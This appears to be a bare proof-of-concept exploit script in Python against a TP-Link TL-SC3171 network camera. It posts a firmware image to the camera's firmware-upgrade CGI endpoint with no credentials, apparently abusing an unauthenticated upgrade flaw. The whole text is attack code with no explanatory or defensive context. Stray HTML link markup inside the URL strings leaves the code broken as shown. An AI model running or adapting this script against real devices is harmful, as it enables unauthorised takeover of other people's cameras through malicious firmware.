import requests
 
requests.get("<a href="http://www.example.com/cgi-bin/firmwareupgrade?action=preset">http://www.example.com/cgi-bin/firmwareupgrade?action=preset</a>")
fileName = "COM_T01F001_LM.1.6.18P12_sign5_TPL.TL-SC3171.bin"
cookies={"VideoFmt":"1"}
requests.post("<a href="http://www.example.com/cgi-bin/firmwareupgrade?action=preset">http://www.example.com/cgi-bin/firmwareupgrade?action=preset</a>", files={"SetFWFileName" : (fileName, open(fileName, "rb"))}, cookies=cookies)
